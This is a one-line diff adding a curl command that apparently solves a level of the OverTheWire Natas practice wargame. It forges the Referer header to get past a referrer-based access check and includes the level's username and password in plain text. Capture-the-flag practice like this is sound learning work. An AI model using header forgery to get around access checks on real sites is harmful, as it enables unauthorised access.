@@ -1,0 +1,1 @@
+curl -H "Referer: http://natas5.natas.labs.overthewire.org/" -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ http://natas4.natas.labs.overthewire.org/index.php
